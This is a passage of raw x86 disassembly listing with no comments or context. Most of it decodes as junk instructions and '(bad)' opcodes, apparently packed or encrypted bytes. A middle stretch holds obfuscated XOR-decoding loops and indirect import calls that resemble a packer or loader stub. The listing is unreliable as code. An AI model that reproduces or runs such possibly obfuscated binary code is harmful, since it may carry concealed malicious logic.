  413324:	int3   
  413325:	out    dx,eax
  413326:	repz fs push ebp
  413329:	sbb    al,0xab
  41332b:	out    dx,al
  41332c:	adc    al,0x75
  41332e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332f:	inc    edx
  413330:	popa   
  413331:	mov    dx,0x4dc5
  413335:	cwde   
  413336:	mov    al,BYTE PTR [eax+0x38]
  413339:	enter  0x3ae,0xd4
  41333d:	mov    bh,0x54
  41333f:	pop    ss
  413340:	shr    bh,0x9a
  413343:	push   0x7329692a
  413348:	fucomi st,st(0)
  41334a:	in     eax,0xf8
  41334c:	ffreep st(0)
  41334e:	mov    dh,0x2e
  413350:	dec    edx
  413351:	fs xor al,0x1b
  413354:	mov    bh,0x51
  413356:	push   ss
  413357:	add    bl,BYTE PTR [ecx+0x77a94b49]
  41335d:	xchg   edi,eax
  41335e:	and    eax,0xffffffb1
  413361:	fmul   QWORD PTR [ecx-0x2]
  413364:	out    0xfd,al
  413366:	jmp    0xd6bc7f6e
  41336b:	add    eax,0x553a1395
  413370:	retf   
  413371:	mov    cl,cl
  413373:	jnp    0x4133e8
  413375:	add    cl,BYTE PTR [edx-0x343f390]
  41337b:	out    0x5b,eax
  41337d:	and    eax,0xd9f731f7
  413382:	sub    ax,0x20e5
  413386:	iret   
  413387:	mov    ebx,eax
  413389:	lods   al,BYTE PTR ds:[esi]
  41338a:	jo     0x4133ea
  41338c:	(bad)  
  41338d:	cwde   
  41338e:	and    ebx,eax
  413390:	hlt    
  413391:	fwait
  413392:	add    DWORD PTR [edi-0x5c3976cb],eax
  413398:	mov    WORD PTR ds:0xa06e92fc,?
  41339e:	jb     0x41338d
  4133a0:	jg     0x41339a
  4133a2:	mov    edi,fs
  4133a4:	(bad)  
  4133a5:	xchg   esp,eax
  4133a6:	cmp    eax,0xc4f59f7d
  4133ab:	fst    DWORD PTR [ebx+ecx*1+0x400ba236]
  4133b2:	ret    
  4133b3:	pop    eax
  4133b4:	jle    0x4133b6
  4133b6:	outs   dx,DWORD PTR ds:[esi]
  4133b7:	mov    DWORD PTR [edx],ebx
  4133b9:	pop    DWORD PTR [edx+0x13]
  4133bc:	xor    eax,0x5aecafaa
  4133c1:	jae    0x41336e
  4133c3:	xchg   cl,dh
  4133c5:	sub    DWORD PTR [eax+ebx*4+0x406be6da],eax
  4133cc:	repz (bad) 
  4133cf:	cmp    eax,0x791a19f6
  4133d4:	sub    dh,bh
  4133d6:	in     eax,dx
  4133d7:	daa    
  4133d8:	imul   edx,DWORD PTR ds:0xba930224,0xffffff94
  4133df:	outs   dx,DWORD PTR ds:[esi]
  4133e0:	sti    
  4133e1:	mov    eax,DWORD PTR [edx+ebp*8]
  4133e4:	mov    ebp,0xd9722007
  4133e9:	ds xchg ecx,eax
  4133eb:	mov    dh,0xbd
  4133ed:	push   esp
  4133ee:	daa    
  4133ef:	pop    esp
  4133f0:	mov    WORD PTR [eax+0x34e02813],gs
  4133f6:	mov    esi,0x65557f33
  4133fb:	jno    0x4133e7
  4133fd:	dec    ebp
  4133fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133ff:	dec    esi
  413400:	sbb    al,0x85
  413402:	pop    es
  413403:	stos   DWORD PTR es:[edi],eax
  413404:	mov    ebx,0xff5dbd45
  413409:	cmp    esi,esp
  41340b:	inc    ebx
  41340c:	shr    bh,0x77
  41340f:	scas   al,BYTE PTR es:[edi]
  413410:	adc    bl,BYTE PTR [esi+ecx*8]
  413413:	xchg   ebp,eax
  413414:	add    bh,BYTE PTR [eax+0x1cd6f0e]
  41341a:	inc    edx
  41341b:	inc    esi
  41341c:	pop    ebp
  41341d:	test   DWORD PTR [ecx+esi*1],edx
  413420:	push   es
  413421:	aad    0x1
  413423:	xchg   edx,eax
  413424:	mov    eax,0xf3ee14e6
  413429:	inc    ebx
  41342a:	ja     0x41341d
  41342c:	fldcw  WORD PTR [eax+0xe1e4f80]
  413432:	sbb    BYTE PTR ds:0xe094c42e,dl
  413438:	in     eax,dx
  413439:	cmc    
  41343a:	pop    ss
  41343b:	js     0x413463
  41343d:	aaa    
  41343e:	mov    es,edi
  413440:	icebp  
  413441:	jmp    0x890e6836
  413446:	pop    ss
  413447:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413448:	mov    cl,bl
  41344a:	inc    edi
  41344b:	add    edx,edx
  41344d:	sbb    eax,0x798012de
  413452:	arpl   ax,cx
  413454:	mov    WORD PTR [edx-0x1a],es
  413457:	sbb    al,0xd8
  413459:	je     0x413499
  41345b:	inc    edi
  41345c:	jne    0x41340a
  41345e:	mov    DWORD PTR [ecx],esp
  413460:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  413462:	adc    edi,DWORD PTR [edx]
  413464:	(bad)  
  413465:	dec    eax
  413466:	cmp    al,0x5a
  413468:	jb     0x4134e1
  41346a:	test   eax,0xed8725c
  41346f:	dec    esp
  413470:	call   0x69c5526b
  413475:	adc    eax,0xd6fc11c0
  41347a:	xor    ecx,DWORD PTR [esi+ebx*2-0x41]
  41347e:	scas   al,BYTE PTR es:[edi]
  41347f:	leave  
  413480:	(bad)  
  413481:	shr    ebp,0x4b
  413484:	bound  ebp,QWORD PTR fs:[edx+0x57077376]
  41348b:	dec    ecx
  41348c:	or     BYTE PTR ds:0x14569131,ah
  413492:	sbb    edi,DWORD PTR [esi-0x73]
  413495:	out    dx,al
  413496:	cmp    eax,0x8d32971d
  41349b:	add    ebp,ebx
  41349d:	jmp    0xacc6668c
  4134a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134a3:	jo     0x413448
  4134a5:	inc    esi
  4134a6:	js     0x413501
  4134a8:	jg     0x41345c
  4134aa:	mov    edx,0xff991a51
  4134af:	push   ecx
  4134b0:	ins    DWORD PTR es:[edi],dx
  4134b1:	ins    BYTE PTR es:[edi],dx
  4134b2:	and    DWORD PTR [edi],ecx
  4134b4:	push   esi
  4134b5:	pop    esi
  4134b6:	leave  
  4134b7:	lods   al,BYTE PTR ds:[esi]
  4134b8:	and    eax,0xaab1a157
  4134bd:	jmp    0x2696482c
  4134c2:	aad    0x93
  4134c4:	out    0x23,eax
  4134c6:	mov    al,0x4f
  4134c8:	ins    BYTE PTR es:[edi],dx
  4134c9:	pop    eax
  4134ca:	pop    ecx
  4134cb:	adc    ebp,0x7ccf63d8
  4134d1:	mov    edx,DWORD PTR [eax]
  4134d3:	leave  
  4134d4:	fadd   DWORD PTR [ecx]
  4134d6:	pop    es
  4134d7:	mov    al,ds:0xe781f8
  4134dc:	imul   ebx,edi,0xc5c77fed
  4134e2:	sbb    bh,ah
  4134e4:	stc    
  4134e5:	adc    esp,eax
  4134e7:	mov    ds:0x57df988f,al
  4134ec:	jae    0x4134f1
  4134ee:	pop    eax
  4134ef:	mov    ah,BYTE PTR [edi+edi*1-0x69]
  4134f3:	add    BYTE PTR [esi+0x7775278c],0xbf
  4134fa:	mov    edi,0x6e60b02f
  4134ff:	sbb    al,bh
  413501:	mov    al,ds:0x3173e304
  413506:	out    0x33,al
  413508:	cmp    eax,0xc877c8af
  41350d:	add    eax,0x9c36478e
  413512:	mov    edx,0x93d9bed6
  413517:	push   edx
  413518:	pushf  
  413519:	mov    ebx,eax
  41351b:	fdivr  st,st(4)
  41351d:	and    al,0xce
  41351f:	dec    esi
  413520:	and    DWORD PTR [esi+0x6],ecx
  413523:	mov    ss,WORD PTR [esi-0x4feb4244]
  413529:	mov    ebp,DWORD PTR ds:0x61bb1e5
  41352f:	lock jnp 0x413557
  413532:	fldenv [esi+0x6e]
  413535:	xchg   esp,eax
  413536:	mov    eax,0x8f9df9a
  41353b:	addr16 popa 
  41353d:	cmp    ah,BYTE PTR [ebx+0x6e]
  413540:	cdq    
  413541:	pushf  
  413542:	call   0x255658a5
  413547:	mov    dl,0x3c
  413549:	out    dx,eax
  41354a:	rcr    DWORD PTR [edx+ebp*8-0x1e],cl
  41354e:	adc    al,0xa4
  413550:	inc    BYTE PTR [ebx]
  413552:	push   0x5b
  413554:	test   eax,0xfae5064c
  413559:	jae    0x413573
  41355b:	aad    0x12
  41355d:	lds    esp,FWORD PTR [esp+eiz*4+0x61]
  413561:	adc    dh,BYTE PTR [ecx+0x9]
  413564:	or     al,0x37
  413566:	and    BYTE PTR [edx],al
  413568:	sub    edi,esp
  41356a:	push   ss
  41356b:	fisub  WORD PTR [edx]
  41356d:	mov    gs,WORD PTR [ebp-0x10]
  413570:	cmp    BYTE PTR [esi-0x2cfe8a9b],bh
  413576:	aam    0x73
  413578:	loopne 0x41352d
  41357a:	imul   edi,DWORD PTR [eax+0xa],0xffffffd3
  41357e:	call   0xb669f908
  413583:	nop
  413584:	in     al,dx
  413585:	sti    
  413586:	sbb    al,0x5e
  413588:	dec    edi
  413589:	loopne 0x413520
  41358b:	scas   al,BYTE PTR es:[edi]
  41358c:	push   edx
  41358d:	das    
  41358e:	sar    BYTE PTR [esi],cl
  413590:	push   ebx
  413591:	aad    0xe0
  413593:	fld    DWORD PTR [ebx-0x744a8612]
  413599:	shr    BYTE PTR [eax+0x44cdd859],cl
  41359f:	xchg   edi,eax
  4135a0:	leave  
  4135a1:	sti    
  4135a2:	push   ecx
  4135a3:	cmp    dh,BYTE PTR [ebx]
  4135a5:	cmp    ah,BYTE PTR [esi+0x9]
  4135a8:	and    eax,0xe3ec0fe3
  4135ad:	stos   BYTE PTR es:[edi],al
  4135ae:	push   eax
  4135af:	sbb    eax,0xd8e82100
  4135b4:	xor    bh,bh
  4135b6:	ins    DWORD PTR es:[edi],dx
  4135b7:	pop    ds
  4135b8:	fidiv  DWORD PTR [esi-0x10]
  4135bb:	pop    ds
  4135bc:	jb     0x4135ff
  4135be:	xor    eax,0xf0f8febb
  4135c3:	jmp    0x3534:0xd6b87312
  4135ca:	jecxz  0x4135f6
  4135cc:	cmp    eax,0xd7056c5b
  4135d1:	in     al,dx
  4135d2:	push   esi
  4135d3:	enter  0x3a97,0xe3
  4135d7:	adc    BYTE PTR [esi+0x5c79ed99],bh
  4135dd:	rcr    edx,1
  4135df:	or     bh,dh
  4135e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135e2:	aam    0x89
  4135e4:	jo     0x41359c
  4135e6:	inc    esp
  4135e7:	mov    ah,0x5b
  4135e9:	int    0x63
  4135eb:	aad    0xd4
  4135ed:	jle    0x4135b0
  4135ef:	mov    al,ds:0x9d6d36c0
  4135f4:	inc    esi
  4135f5:	enter  0xa889,0xf0
  4135f9:	mov    edi,0x1fa939b8
  4135fe:	adc    eax,0xba342fad
  413603:	pop    edx
  413604:	mov    ebx,0xdf32fd8
  413609:	outs   dx,DWORD PTR ds:[esi]
  41360a:	lods   al,BYTE PTR ds:[esi]
  41360b:	dec    eax
  41360c:	mov    BYTE PTR [eax-0x15],ah
  41360f:	adc    eax,0x1b252e3c
  413614:	jge    0x413672
  413616:	popa   
  413617:	cs mov ah,bh
  41361a:	test   al,0xb6
  41361c:	not    DWORD PTR [eax+0x31]
  41361f:	xchg   esp,eax
  413620:	adc    al,0x63
  413622:	retf   0x7f65
  413625:	dec    ebx
  413626:	xor    eax,0xf586d7be
  41362b:	xlat   BYTE PTR ds:[ebx]
  41362c:	or     DWORD PTR [esp+eiz*8+0x54],edx
  413630:	jge    0x41364b
  413632:	fcom   st(0)
  413634:	push   esi
  413635:	ss push eax
  413637:	jg     0x4135f6
  413639:	pusha  
  41363a:	xchg   ebx,eax
  41363b:	or     ebx,edi
  41363d:	cmp    edi,ecx
  41363f:	xchg   esp,eax
  413640:	mov    BYTE PTR [ebp-0x49185aa9],ah
  413646:	xchg   edx,eax
  413647:	and    bl,BYTE PTR [ebp+ecx*2+0x5ddbfd7d]
  41364e:	inc    ecx
  41364f:	adc    dl,bh
  413651:	xor    dh,BYTE PTR [ebx+0x7d124b23]
  413657:	je     0x4135f4
  413659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41365a:	mov    BYTE PTR [ebx+edi*8-0x1b],al
  41365e:	mov    BYTE PTR [ebx],0xd6
  413661:	jmp    0x4136fe
  413666:	mov    edi,DWORD PTR ds:0x432010
  41366c:	or     edi,DWORD PTR ds:0x43101c
  413672:	mov    DWORD PTR ds:0x432010,edi
  413678:	mov    edi,DWORD PTR [ebp+0x8]
  41367b:	xor    ecx,0x33c4
  413681:	mov    ecx,0x8a8e
  413686:	sub    DWORD PTR ds:0x42f018,0x431000
  413690:	xor    cx,WORD PTR [edi+edx*4+0x2]
  413695:	movzx  edi,WORD PTR ds:0x431008
  41369c:	or     edi,DWORD PTR ds:0x43201c
  4136a2:	mov    DWORD PTR ds:0x431008,edi
  4136a8:	mov    edi,0x3b52
  4136ad:	xor    DWORD PTR ds:0x42f014,0x42e00c
  4136b7:	add    cx,di
  4136ba:	add    DWORD PTR ds:0x42e008,0x7149
  4136c4:	movzx  ecx,cx
  4136c7:	mov    DWORD PTR [ebp-0xc],ecx
  4136ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4136cd:	movzx  ecx,WORD PTR [ecx+edx*4]
  4136d1:	sbb    DWORD PTR ds:0x42f00c,0x431000
  4136db:	xor    ecx,0x8a8e
  4136e1:	sbb    DWORD PTR ds:0x432010,0x432000
  4136eb:	add    ecx,edi
  4136ed:	mov    edi,DWORD PTR [ebp-0xc]
  4136f0:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  4136f7:	mov    ecx,DWORD PTR ds:0x42f004
  4136fd:	inc    edx
  4136fe:	mov    ecx,DWORD PTR [ebp-0x10]
  413701:	cmp    edx,ecx
  413703:	mov    DWORD PTR ds:0x430010,0x10d
  41370d:	jne    0x413666
  413713:	mov    ecx,DWORD PTR [ebp-0x18]
  413716:	mov    edx,DWORD PTR [ebp+0x10]
  413719:	or     DWORD PTR ds:0x430000,0x4712
  413723:	xor    ecx,eax
  413725:	and    DWORD PTR ds:0x42f004,0x0
  41372f:	jmp    0x413743
  413734:	xor    edi,edi
  413736:	add    edi,DWORD PTR ds:0x42f004
  41373c:	inc    edi
  41373d:	mov    DWORD PTR ds:0x42f004,edi
  413743:	cmp    DWORD PTR ds:0x42f004,0x13
  41374a:	jae    0x413796
  413750:	cmp    DWORD PTR ds:0x42f004,0xc
  413757:	jbe    0x413796
  41375d:	jmp    0x413777
  413762:	push   0x7f36
  413767:	push   0x430004
  41376c:	push   0x6180
  413771:	call   DWORD PTR ds:0x434907
  413777:	cmp    DWORD PTR ds:0x42f004,0xb
  41377e:	jne    0x413791
  413784:	mov    edi,DWORD PTR ds:0x42f004
  41378a:	inc    edi
  41378b:	mov    DWORD PTR ds:0x42f004,edi
  413791:	jmp    0x413734
  413796:	add    ecx,esi
  413798:	dec    edi
  413799:	mov    DWORD PTR [edx],ecx
  41379b:	mov    ecx,DWORD PTR [ebp-0x18]
  41379e:	xor    DWORD PTR ds:0x430000,ecx
  4137a4:	xor    ecx,eax
  4137a6:	sub    edi,0x1615
  4137ac:	add    ecx,esi
  4137ae:	mov    DWORD PTR [ebp-0xc],ecx
  4137b1:	mov    edi,DWORD PTR ds:0x432008
  4137b7:	add    DWORD PTR ds:0x42e014,edi
  4137bd:	mov    DWORD PTR [ebp+0x8],0xf89c8581
  4137c4:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  4137cb:	mov    DWORD PTR [ebp-0x10],0xf89c9581
  4137d2:	xor    DWORD PTR ds:0x432010,edx
  4137d8:	mov    ecx,DWORD PTR [ebp-0x14]
  4137db:	xor    DWORD PTR ds:0x432000,edi
  4137e1:	mov    DWORD PTR [ebp+0x8],ecx
  4137e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4137e7:	adc    DWORD PTR ds:0x43001c,0x42e01c
  4137f1:	xor    ecx,eax
  4137f3:	add    ecx,esi
  4137f5:	mov    ecx,0x242ebed
  4137fa:	mov    DWORD PTR ds:0x42f01c,0x2580
  413804:	mov    edi,0xf641bf2
  413809:	je     0x41ab5c
  41380f:	and    DWORD PTR ds:0x432014,0x57c2
  413819:	mov    edx,DWORD PTR [ebp+0x8]
  41381c:	adc    ebx,0x6e0a
  413822:	mov    ebx,DWORD PTR [ebp-0x8]
  413825:	xor    edx,eax
  413827:	or     DWORD PTR ds:0x42e020,0x11fc
  413831:	xor    ebx,eax
  413833:	adc    DWORD PTR ds:0x430010,0x2848
  41383d:	sub    edx,ebx
  41383f:	sbb    DWORD PTR ds:0x431010,0x4ed3
  413849:	sub    edx,esi
  41384b:	adc    ebx,DWORD PTR ds:0x431018
  413851:	xor    edx,eax
  413853:	mov    DWORD PTR [ebp+0x8],edx
  413856:	mov    edx,DWORD PTR [ebp+0x8]
  413859:	mov    ebx,DWORD PTR [ebp-0x58]
  41385c:	sub    DWORD PTR ds:0x42e018,0xd4c
  413866:	add    edx,0x5708c0
  41386c:	imul   edx,ebx
  41386f:	and    DWORD PTR ds:0x432010,0x0
  413879:	jmp    0x41388b
  41387e:	mov    ebx,DWORD PTR ds:0x432010
  413884:	inc    ebx
  413885:	mov    DWORD PTR ds:0x432010,ebx
  41388b:	cmp    DWORD PTR ds:0x432010,0x16
  413892:	jae    0x4138bd
  413898:	cmp    DWORD PTR ds:0x432010,0x20
  41389f:	jg     0x4138bd
  4138a5:	jmp    0x4138b8
  4138aa:	push   0x58a4
  4138af:	push   DWORD PTR [ebp-0x10]
  4138b2:	call   DWORD PTR ds:0x4348df
  4138b8:	jmp    0x41387e
  4138bd:	mov    DWORD PTR [ebp-0x58],edx
  4138c0:	movzx  ebx,BYTE PTR ds:0x42f01c
  4138c7:	sbb    ebx,DWORD PTR ds:0x42e018
  4138cd:	mov    DWORD PTR ds:0x42f01c,ebx
  4138d3:	mov    edx,DWORD PTR [ebp+0x8]
  4138d6:	and    DWORD PTR ds:0x430014,0x0
  4138e0:	mov    ebx,DWORD PTR ds:0x430014
  4138e6:	inc    ebx
  4138e7:	mov    DWORD PTR ds:0x430014,ebx
  4138ed:	cmp    DWORD PTR ds:0x430014,0xc
  4138f4:	ja     0x41392c
  4138fa:	jmp    0x413905
  4138ff:	call   DWORD PTR ds:0x434913
  413905:	cmp    DWORD PTR ds:0x430014,0xb
  41390c:	jne    0x41391f
  413912:	mov    ebx,DWORD PTR ds:0x430014
  413918:	inc    ebx
  413919:	mov    DWORD PTR ds:0x430014,ebx
  41391f:	cmp    DWORD PTR ds:0x430014,0x19
  413926:	jb     0x4138e0
  41392c:	mov    ebx,DWORD PTR [ebp-0x54]
  41392f:	xor    DWORD PTR ds:0x42e01c,0x42f010
  413939:	add    edx,0x64f8a2
  41393f:	or     edx,ebx
  413941:	dec    ebx
  413942:	mov    DWORD PTR [ebp-0x54],edx
  413945:	mov    edx,DWORD PTR [ebp+0x8]
  413948:	mov    ebx,DWORD PTR [ebp-0x50]
  41394b:	add    edx,ecx
  41394d:	not    DWORD PTR ds:0x42e018
  413953:	xor    edx,ebx
  413955:	mov    DWORD PTR [ebp-0x50],edx
  413958:	xor    ebx,ebx
  41395a:	add    ebx,DWORD PTR ds:0x41d072
  413960:	xor    edx,edx
  413962:	or     edx,DWORD PTR ds:0x41d092
  413968:	sub    ebx,edx
  41396a:	imul   ebx,DWORD PTR [ebx+edx*1]
  41396e:	mov    edx,DWORD PTR [ebp+0x8]
  413971:	mov    ebx,DWORD PTR [ebp-0x4c]
  413974:	or     DWORD PTR ds:0x42e024,0x7bc8
  41397e:	add    edx,edi
  413980:	and    edx,ebx
  413982:	adc    DWORD PTR ds:0x432000,ecx
  413988:	mov    DWORD PTR [ebp-0x4c],edx
  41398b:	mov    edx,DWORD PTR [ebp+0x8]
  41398e:	add    DWORD PTR ds:0x431000,ebx
  413994:	mov    ebx,DWORD PTR [ebp-0x48]
  413997:	add    DWORD PTR ds:0x431004,0x3491
  4139a1:	lea    edx,[ebx+edx*1+0x241fc1f]
  4139a8:	mov    DWORD PTR [ebp-0x48],edx
  4139ab:	mov    DWORD PTR ds:0x42e020,0x13
  4139b5:	cmp    DWORD PTR ds:0x42e020,0x0
  4139bc:	je     0x413a09
  4139c2:	cmp    DWORD PTR ds:0x42e020,0x5
  4139c9:	jl     0x413a09
  4139cf:	jmp    0x4139dd
  4139d4:	push   DWORD PTR [ebp-0x10]
  4139d7:	call   DWORD PTR ds:0x434917
  4139dd:	cmp    DWORD PTR ds:0x42e020,0x6
  4139e4:	jne    0x4139f7
  4139ea:	mov    ebx,DWORD PTR ds:0x42e020
  4139f0:	dec    ebx
  4139f1:	mov    DWORD PTR ds:0x42e020,ebx
  4139f7:	mov    ebx,DWORD PTR ds:0x42e020
  4139fd:	dec    ebx
  4139fe:	mov    DWORD PTR ds:0x42e020,ebx
  413a04:	jmp    0x4139b5
  413a09:	mov    edx,DWORD PTR [ebp+0x8]
  413a0c:	xor    ebx,DWORD PTR ds:0x42e018
  413a12:	mov    ebx,0xfa5e15e2
  413a17:	sub    DWORD PTR ds:0x42e028,0x60ce
  413a21:	sub    ebx,edx
  413a23:	add    ebx,DWORD PTR [ebp-0x44]
  413a26:	mov    DWORD PTR ds:0x43100c,0x16
  413a30:	cmp    DWORD PTR ds:0x43100c,0x0
  413a37:	je     0x413a8b
  413a3d:	cmp    DWORD PTR ds:0x43100c,0xc
  413a44:	ja     0x413a8b
  413a4a:	jmp    0x413a5f
  413a4f:	push   0x434082
  413a54:	push   0x400000
  413a59:	call   DWORD PTR ds:0x43491f
  413a5f:	cmp    DWORD PTR ds:0x43100c,0xd
  413a66:	jne    0x413a79
  413a6c:	mov    edx,DWORD PTR ds:0x43100c
  413a72:	dec    edx
  413a73:	mov    DWORD PTR ds:0x43100c,edx
  413a79:	mov    edx,DWORD PTR ds:0x43100c
  413a7f:	dec    edx
  413a80:	mov    DWORD PTR ds:0x43100c,edx
  413a86:	jmp    0x413a30
  413a8b:	mov    DWORD PTR [ebp-0x44],ebx
  413a8e:	movzx  edx,BYTE PTR ds:0x431018
  413a95:	or     DWORD PTR ds:0x42e01c,edx
  413a9b:	mov    edx,DWORD PTR [ebp+0x8]
  413a9e:	xor    edx,eax
  413aa0:	or     DWORD PTR ds:0x42e00c,0x432004
  413aaa:	add    edx,esi
  413aac:	mov    DWORD PTR ds:0x43000c,0x316a
  413ab6:	jne    0x41380f
  413abc:	mov    DWORD PTR ds:0x431010,0x2279
  413ac6:	jmp    0x41ab5c
  413acb:	and    DWORD PTR ds:0x43100c,0x0
  413ad5:	mov    edx,DWORD PTR ds:0x43100c
  413adb:	inc    edx
  413adc:	mov    DWORD PTR ds:0x43100c,edx
  413ae2:	cmp    DWORD PTR ds:0x43100c,0x11
  413ae9:	jle    0x413b2d
  413aef:	jmp    0x413b04
  413af4:	push   0x80c1
  413af9:	push   0x8496
  413afe:	call   DWORD PTR ds:0x434923
  413b04:	cmp    DWORD PTR ds:0x43100c,0x10
  413b0b:	jne    0x413b20
  413b11:	xor    edx,edx
  413b13:	or     edx,DWORD PTR ds:0x43100c
  413b19:	inc    edx
  413b1a:	mov    DWORD PTR ds:0x43100c,edx
  413b20:	cmp    DWORD PTR ds:0x43100c,0x1c
  413b27:	jb     0x413ad5
  413b2d:	mov    edx,DWORD PTR [ebp-0xc]
  413b30:	movzx  ebx,BYTE PTR ds:0x43201c
  413b37:	xor    DWORD PTR ds:0x42e00c,ebx
  413b3d:	sub    edx,esi
  413b3f:	sbb    DWORD PTR ds:0x42f014,ecx
  413b45:	xor    edx,eax
  413b47:	neg    ebx
  413b49:	mov    DWORD PTR [ebp-0x5c],edx
  413b4c:	mov    ebx,DWORD PTR ds:0x41d0b2
  413b52:	mov    ebx,DWORD PTR [ebx]
  413b54:	sbb    DWORD PTR ds:0x43100c,ebx
  413b5a:	mov    edx,DWORD PTR [ebp-0x10]
  413b5d:	mov    DWORD PTR ds:0x432008,0x14
  413b67:	cmp    DWORD PTR ds:0x432008,0x0
  413b6e:	je     0x413ba3
  413b74:	cmp    DWORD PTR ds:0x432008,0x19
  413b7b:	jb     0x413ba3
  413b81:	jmp    0x413b91
  413b86:	push   0x434009
  413b8b:	call   DWORD PTR ds:0x434927
  413b91:	mov    ebx,DWORD PTR ds:0x432008
  413b97:	dec    ebx
  413b98:	mov    DWORD PTR ds:0x432008,ebx
  413b9e:	jmp    0x413b67
  413ba3:	mov    ebx,DWORD PTR [ebp-0x8]
  413ba6:	xor    edx,eax
  413ba8:	adc    DWORD PTR ds:0x430000,0x6f74
  413bb2:	xor    ebx,eax
  413bb4:	sub    edx,ebx
  413bb6:	xor    DWORD PTR ds:0x43000c,0x3be
  413bc0:	sub    edx,esi
  413bc2:	adc    DWORD PTR ds:0x432018,0x6de5
  413bcc:	xor    edx,eax
  413bce:	mov    DWORD PTR ds:0x431008,0x236c
  413bd8:	mov    DWORD PTR [ebp-0x10],edx
  413bdb:	not    edx
  413bdd:	mov    edx,DWORD PTR [ebp-0x14]
  413be0:	mov    DWORD PTR [ebp+0x8],edx
  413be3:	mov    DWORD PTR ds:0x431014,0x5696
  413bed:	jmp    0x4161ca
  413bf2:	mov    edx,DWORD PTR [ebp+0x8]
  413bf5:	and    DWORD PTR ds:0x42f014,0x0
  413bff:	jmp    0x413c13
  413c04:	xor    ebx,ebx
  413c06:	or     ebx,DWORD PTR ds:0x42f014
  413c0c:	inc    ebx
  413c0d:	mov    DWORD PTR ds:0x42f014,ebx
  413c13:	cmp    DWORD PTR ds:0x42f014,0x1e
  413c1a:	jae    0x413c50
  413c20:	cmp    DWORD PTR ds:0x42f014,0x2e
  413c27:	jb     0x413c50
  413c2d:	jmp    0x413c4b
  413c32:	push   DWORD PTR [ebp-0x10]
  413c35:	push   0x8926
  413c3a:	push   DWORD PTR [ebp-0x10]
  413c3d:	push   0x6bd5
  413c42:	push   DWORD PTR [ebp-0x10]
  413c45:	call   DWORD PTR ds:0x4348b7
  413c4b:	jmp    0x413c04
  413c50:	mov    ebx,DWORD PTR [ebp-0x8]
  413c53:	xor    DWORD PTR ds:0x42e000,0x431018
  413c5d:	jmp    0x416018
  413c62:	fnstsw WORD PTR [esi+0x771bb57b]
  413c68:	mov    bl,0x96
  413c6a:	aam    0x9b
  413c6c:	aas    
  413c6d:	push   ebp
  413c6e:	mov    ds:0x4147c338,eax
  413c73:	mov    dh,BYTE PTR [edx+0x72]
  413c76:	rcr    BYTE PTR [edi+0x72],1
  413c79:	jb     0x413c1d
  413c7b:	ins    BYTE PTR es:[edi],dx
  413c7c:	xor    al,dh
  413c7e:	or     ebp,DWORD PTR [ebx-0x47afcce9]
  413c84:	or     BYTE PTR [ebx+0xf0c7a54],ch
  413c8a:	jb     0x413c47
  413c8c:	pushf  
  413c8d:	and    BYTE PTR [ecx+0x790e0ef0],ah
  413c93:	aam    0x43
  413c95:	outs   dx,DWORD PTR ds:[esi]
  413c96:	adc    ch,0xd7
  413c99:	adc    al,0xcb
  413c9b:	sub    al,0x8e
  413c9d:	mov    edi,0x6bd77d52
  413ca2:	inc    edx
  413ca3:	mov    dh,0xa3
  413ca5:	pusha  
  413ca6:	int    0x35
  413ca8:	pop    ecx
  413ca9:	dec    esp
  413caa:	out    dx,eax
  413cab:	out    0xc8,eax
  413cad:	ror    dh,1
  413caf:	call   0x747374f4
  413cb4:	mov    bh,0x7d
  413cb6:	mov    DWORD PTR [eax],edi
  413cb8:	in     eax,0x81
  413cba:	mov    eax,0x4ee0d2ac
  413cbf:	repnz push ebx
  413cc1:	sahf   
  413cc2:	ret    0xc920
  413cc5:	and    dl,BYTE PTR [edi+0x1fac0886]
  413ccb:	out    dx,al
  413ccc:	mov    ebx,DWORD PTR [ebp+0x42]
  413ccf:	sub    al,0x96
  413cd1:	fidiv  WORD PTR [edi-0x17]
  413cd4:	jp     0x413d33
  413cd6:	sbb    al,0x93
  413cd8:	cmp    dl,BYTE PTR [edi]
  413cda:	mov    ebx,ecx
  413cdc:	stos   DWORD PTR es:[edi],eax
  413cdd:	xchg   edi,eax
  413cde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cdf:	lds    esi,FWORD PTR [ebx]
  413ce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ce2:	stc    
  413ce3:	jg     0x413d53
  413ce5:	cdq    
  413ce6:	out    dx,eax
  413ce7:	pop    ds
  413ce8:	not    eax
  413cea:	sub    eax,DWORD PTR [edi-0x221398b4]
  413cf0:	jmp    0xf295:0x21387b59
  413cf7:	mov    edx,0xd427ffa1
  413cfc:	in     eax,0x32
  413cfe:	inc    ecx
  413cff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d00:	cmp    BYTE PTR [edx+0x2d46c861],bl
  413d06:	xchg   ecx,eax
  413d07:	add    DWORD PTR [edx+0x76],0x29
  413d0b:	sbb    BYTE PTR [esi],al
  413d0d:	or     al,0x38
  413d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d10:	dec    ebp
  413d11:	mov    eax,ds:0xdb14b29d
  413d16:	dec    esp
  413d17:	js     0x413d85
  413d19:	ds sbb dl,bl
  413d1c:	scas   eax,DWORD PTR es:[edi]
  413d1d:	call   DWORD PTR [ebp-0x427a22b]
  413d23:	nop
  413d24:	add    DWORD PTR [edx-0x2a1239f2],ebx
  413d2a:	iret   
  413d2b:	sub    BYTE PTR [esi+0x25],bh
  413d2e:	lock adc eax,0x205723da
  413d34:	int    0x97
  413d36:	jnp    0x413d06
  413d38:	xlat   BYTE PTR ds:[ebx]
  413d39:	xor    ebx,ecx
  413d3b:	into   
  413d3c:	dec    ecx
  413d3d:	shr    BYTE PTR [ebx+0x54],cl
  413d40:	sbb    ah,BYTE PTR [edi]
  413d42:	stos   BYTE PTR es:[edi],al
  413d43:	or     DWORD PTR [ebp-0x6b],edx
  413d46:	mov    esi,0x18e44a24
  413d4b:	es pop ebp
